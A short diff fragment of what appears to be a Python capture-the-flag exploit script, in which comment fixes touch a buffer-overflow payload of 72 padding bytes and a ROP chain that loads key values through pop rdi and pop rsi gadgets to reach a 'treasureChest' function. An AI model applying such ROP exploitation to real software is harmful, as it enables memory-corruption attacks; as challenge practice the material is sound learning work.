@@ -11,13 +11,13 @@ pop_rdx = 0x400867 # pop rdx
 # address of treasureChest 
 win = 0x400797
 
-# offer
+# offset
 payload = b'A' * 72
 
 # ---------------------- ROP chain ---------------------------
 # pop rdi + key1
 # pop rsi + key2 + 0 (no need for r15)
-# pop rdx
+# pop rdx + key3
 # address of treasureChest
 payload += p64(pop_rdi) + p64(0x13371337)
 payload += p64(pop_rsi) + p64(0xdeadbeef) + p64(0)
